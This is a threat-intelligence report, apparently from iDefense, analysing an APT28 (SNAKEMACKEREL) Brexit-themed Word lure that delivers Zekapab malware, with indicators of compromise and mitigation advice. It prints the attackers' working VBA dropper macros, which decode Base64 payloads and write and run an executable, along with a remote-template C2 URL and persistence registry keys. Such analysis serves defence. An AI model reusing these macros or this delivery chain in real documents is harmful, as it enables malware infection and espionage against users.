@@ -1,0 +1,195 @@
+SNAKEMACKEREL
+A BREXIT-themed lure document that delivers ZEKAPAB malware
+
+SNAKEMACKEREL
+As the United Kingdom (UK) Prime Minister Theresa May announced the initial BREXIT draft agreement with the European Union (EU), iDefense analysts identified a new campaign by SNAKEMACKEREL using a BREXIT-themed lure document to deliver the Zekapab (also known as Zebrocy) first-stage malware.
+
+WHAT’S THE STORY?
+SNAKEMACKEREL is an espionage-motivated cyber threat group, also known as Sofacy, Pawn Storm, Sednit, Fancy Bear, APT28, Group 74, Tsar Team, and Strontium.
+Both the British and Dutch governments have publicly attributed SNAKEMACKEREL activities to the Russian military intelligence service (RIS) and have linked specific cyberattacks to the group, including the targeting of the Organisation for the Prohibition of Chemical Weapons (OPCW), the United Kingdom Defence and Science Technology Laboratory (DSTL) and the United Kingdom Foreign and Commonwealth Office (FCO).
+In foreign countries, RIS actors conducted damaging and/or disruptive cyberattacks, including attacks on critical infrastructure networks. In some cases, RIS actors “masqueraded as third parties, hiding behind false online personas designed to cause the victim to misattribute the source of the attack.”
+According to the FBI, the SNAKEMACKEREL threat group "is part of an ongoing campaign of cyber-enabled operations directed at the United States government and its citizens. These cyber operations have included spear phishing campaigns targeting government organizations, critical infrastructure entities, think tanks, universities, political organizations, and corporations, leading to the theft of information.
+
+WHAT DOES IT MEAN?
+The creation of this malicious document, coming on the same day that the UK government announced an initial agreed draft of the BREXIT agreement, suggests that SNAKEMACKEREL is a group that pays close attention to political affairs and is able to leverage the latest news headlines to develop lure documents to deliver first-stage malware, such as Zekapab, to its intended targets. The theme also reflects the targeting of the group which primarily focuses on NATO members, countries in Central Asia and those neighboring Russia.
+Given the assumed association with the Russian military service, it is clear that the group has significant resources to target and compromise organizations. As a result, it requires extra investment in defensive measures. To protect the confidentiality, integrity and availability of business operations, Accenture Security recommends that organizations ensure their staff members receive security hygiene training and deploy intelligence-driven network and host-based defensive measures.
+
+WHY DOES IT MATTER?
+Despite the public reporting and government accusations, SNAKEMACKEREL remains highly active. It is behind a large number of cyberattacks targeting global aerospace and defense contractors, military units, political parties, the International Olympic Committee (IOC), anti-doping agencies, government departments and various other verticals. NATO and EU member countries, as well as the United States, are of particular interest to the group.
+SNAKEMACKEREL operations continue to be some of the most far-reaching and sophisticated cyber espionage and intelligence campaigns to date.
+
+TECHNICAL ANALYSIS
+This report provides a technical overview of a BREXIT-themed lure Microsoft Office document that is used to drop a Delphi version of the Zekapab first-stage malware which has been previously reported by iDefense analysts. However, additional research on the C2 server 109.248.148.42 revealed a new .NET version of Zekapab that is designed for the same purpose.
+
+MALWARE ANALYSIS
+iDefense analysts recently came across the following malicious document that is purportedly related to the recent BREXIT negotiations between the UK and the EU.
+The file has the following metadata:
+• Filename: Brexit 15.11.2018.docx
+• MD5: 405655be03df45881aa88b55603bef1d
+• File size: 18.9 KB (19354 bytes)
+• Author: USER
+• Last modified by: Joohn
+• Company: Grizli777
+• Creation date: 2018:11:14 14:17:00
+• Modified date: 2018:11:15 04:50:00
+Of note, the Company name Grizli777 is indicative of a cracked version of Microsoft Word.
+To trick the targeted individual into enabling macros, the attackers deliberately used jumbled-up text as content.
+The document loads malicious content from hxxp://109.248.148.42/office/thememl/2012/main/attachedTemplate.dotm via the settings.xml.rels component that is embedded within the DOCX document.
+The downloaded macro component includes a function called AutoClose() as well as two payloads embedded via Base64 encoded strings.
+The code snippet below shows the core macro code that is identical to the macro code in an earlier campaign in April 2018 as reported by ESET:
+
+Public Function FolderExists(FolderPath As String) As Boolean
+On Error Resume Next
+  ChDir FolderPath
+  If Err Then FolderExists = False Else FolderExists = True
+End Function
+
+Function FileExists(fname) As Boolean
+   On Error Resume Next
+   FileExists = Dir(fname) <> vbNullString
+   If Err.Number <> 0 Then FileExists = False
+   On Error GoTo 0
+End Function
+
+Sub AutoClose()
+  Dim vFileName As String
+  Dim vDocName As String
+  Application.ActiveWindow.WindowState = wdWindowStateMinimize
+  vAdd = "ntslwin."
+  vFileName = Environ("APPDATA") & "\NetworkNV\"
+  If Not FolderExists(vFileName) Then MkDir (vFileName)
+  vFileName = vFileName + vAdd & "exe"
+  If Not FileExists(vFileName) Then SaveFN vFileName, convText(UserForm1.Label2.Caption)
+  vDocName = Environ("TEMP") & "\~de03fc12a.docm"
+  If Not FileExists(vDocName) Then SaveFN vDocName, convText(UserForm1.Label1.Caption)
+  zyx (vDocName)
+  Application.Quit
+End Sub
+
+Private Function convText(dsf)
+Dim dm, el
+  Set dm = CreateObject("Microsoft.XMLDOM")
+  Set el = dm.CreateElement("tmp")
+  el.DataType = "bin.base64"
+  el.Text = dsf
+  convText = el.NodeTypedValue
+End Function
+
+Private Sub SaveFN(vNum, vBun)
+  Dim binaryStream
+  Set binaryStream = CreateObject("ADODB.Stream")
+    binaryStream.Type = 1
+    binaryStream.Open
+    binaryStream.Write vBun
+    binaryStream.SaveToFile vNum, 2
+End Sub
+
+Public Function zyx(vF)
+  Dim WA As Object, oMyDoc As Object
+  Set WA = CreateObject("Word.Application")
+  WA.Visible = False
+  Set oMyDoc = WA.Documents.Open(vF)
+  WA.Application.Run "Module1.Proc1"
+  Set oMyDoc = Nothing: Set WA = Nothing
+End Function
+
+Public Function WriteBinary(strBinary, strPath)
+    Dim oFSO: Set oFSO = CreateObject("Scripting.FileSystemObject")
+    Dim oTxtStream
+    On Error Resume Next
+    Set oTxtStream = oFSO.createTextFile(strPath)
+    Set oTxtStream = Nothing
+    With oFSO.createTextFile(strPath)
+        .Write (strBinary)
+        .Close
+    End With
+End Function
+
+Research on the malicious IP address 109.248.148.42 revealed two different .dotm components:
+• Filename: attachedTemplate.dotm
+• MD5: 018611b879b2bbd886e86b62484494da
+• File size: 1.5 MB (1612982 bytes)
+• Filename: templates.dotm
+• MD5: 2a794b55b839b3237482098957877326
+• File size: 1.2 MB (1228358 bytes)
+
+The two components are dropped from the following URLs respectively:
+hxxp://109.248.148.42/office/thememl/2012/main/attachedTemplate.dotm
+hxxp://109.248.148.42/officeDocument/2006/relationships/templates.dotm
+Both components contain an identical VBA macro code as shown above, each containing two different embedded payloads: one is an executable binary file and the other is a .docm file.
+
+attachedTemplate.dotm dropped the following:
+• Filename: ntslwin.exe
+• MD5: 7e67122d3a052e4755b02965e2e56a2e
+• File size: 384.0 KB (393216 bytes)
+• File type: UPX compressed Win32 Executable
+• Filename: ~de03fc12a.docm
+• MD5: 9d703d31795bac83c4dd90527d149796
+• File size: 384.0 KB (24659 bytes)
+
+templates.dotm dropped the following:
+• Filename: ntslwin.exe
+• MD5: a13c864980159cd9bdc94074b2389dda
+• Compilation timestamp: 2018-11-13 10:45:42
+• File size: 32.0 KB (32768 bytes)
+• File type: PE32 executable for MS Windows (GUI) Intel 80386 32-bit Mono/.Net assembly
+• Filename: ~de03fc12a.docm
+• MD5: 9d703d31795bac83c4dd90527d149796
+• File size: 384.0 KB (24659 bytes)
+
+The second macro file ~de03fc12a.docm dropped includes a simple macro to execute the dropped executable. The code snippet below shows the embedded macro code:
+Sub Proc1()
+  Dim vFileName As String
+  Dim add As String
+  vAdd = "ntslwin."
+  vFileName = Environ("APPDATA") & "\NetworkNV\"
+  vFileName = vFileName + vAdd & "exe"
+  Shell vFileName
+  Application.Quit
+End Sub
+
+Analysis into the two binaries shows that they are in fact a Delphi (initially UPX packed) and .NET version of the Zekapab first-stage malware.
+The following network traffic is performed by the Delphi sample which has the following metadata once unpacked by UPX:
+• Filename: ntslwin.exe
+• MD5: f4cab3a393462a57639faa978a75d10a
+• File size: 984.5 KB (1008128 bytes)
+• File type: Win32 Executable Borland Delphi 7
+The network traffic generated by the sample is a HTTP POST request containing the system information collected. As shown, the data sent appears to be URL encoded.
+On the other hand, the network traffic generated by the .NET version is unencoded.
+Both versions are designed to collect system information and running processes and send them to the designated C2 server using HTTP POST to the URI used in both cases is /agr-enum/progress-inform/cube.php?res=.
+If the system is deemed interesting, the next stage malware would be delivered into corresponding directories.
+The second-stage malware is delivered to different destinations with an autorun registry key set respectively.
+For the Delphi version, the following registry key and value are used for persistence:
+Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\AudioMgr
+Value: %AppData%\Video\videodrv.exe
+For the .NET version, the following registry key and value are used for persistence:
+Key: HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\GoogleIndexer
+Value: %AppData%\Platform\sslwin.exe
+The function for collecting data as shown in the .NET version includes the list of information collected:
+• Results from the commands systeminfo and tasklist
+• Current execution path
+• Capture screenshot
+• Drive enumeration
+• Drive serial number
+The code for downloading and executing the next stage malware, with the persistence mechanism set is shown. The delivery of the next-stage malware is dependent on the information collected.
+
+MITIGATION
+To mitigate the threat described in this report, iDefense recommends blocking access to the IP address and URI pattern:
+• 109.248.148.42
+• /agr-enum/progress-inform/cube.php?res=
+For threat hunting, iDefense recommends searching for the following:
+Network: Presence of HTTP and DNS traffic to the network IOCs shared above.
+System: Presence of the following artifacts.
+Persistence mechanism(s)
+Registry Key:
+Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\AudioMgr
+Key: HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\GoogleIndexer
+On disk artefacts
+o File with the full path: %AppData%\Video\videodrv.exe
+o File with the full path: %AppData%\Platform\sslwin.exe
+o Files with following file hashes.
+File hashes:
+405655be03df45881aa88b55603bef1d
+7e67122d3a052e4755b02965e2e56a2e
+a13c864980159cd9bdc94074b2389dda
+9d703d31795bac83c4dd90527d149796
